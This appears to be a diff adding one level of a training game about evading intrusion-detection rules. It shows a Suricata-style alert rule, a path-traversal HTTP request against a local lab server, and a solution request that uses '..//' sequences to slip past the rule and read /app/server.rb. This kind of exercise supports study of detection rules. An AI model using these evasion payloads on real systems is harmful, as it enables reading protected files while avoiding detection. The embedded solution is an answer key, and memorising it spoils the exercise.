@@ -1,0 +1,31 @@
+name: 'Path Traversal (URI) 2'
+type: 'exploit'
+
+text: |-
+  Time to bypass the rule(s) below! You're on your own now, but feel free to
+  ask questions!
+
+  (The point of this level is to show how hard it is to use `http.uri.raw` safely :)
+
+  **Goal: Print (`cat`) `/app/server.rb`**
+
+hints: []
+
+target: pathing
+
+base_request: |-
+  GET /../../../../../../../app/server.rb HTTP/1.1
+  Host: localhost
+
+solution: |-
+  GET /..//..//..//..//..//..//..//app/server.rb HTTP/1.1
+  Host: localhost
+
+solution_note: Doesn't handle ..//..//
+
+rules:
+# Raw, doesn't handle `.//.`
+- >
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri.raw; url_decode; content: "./."; sid:123456; rev:1;)
+
+expected_output: "TCPServer.new"
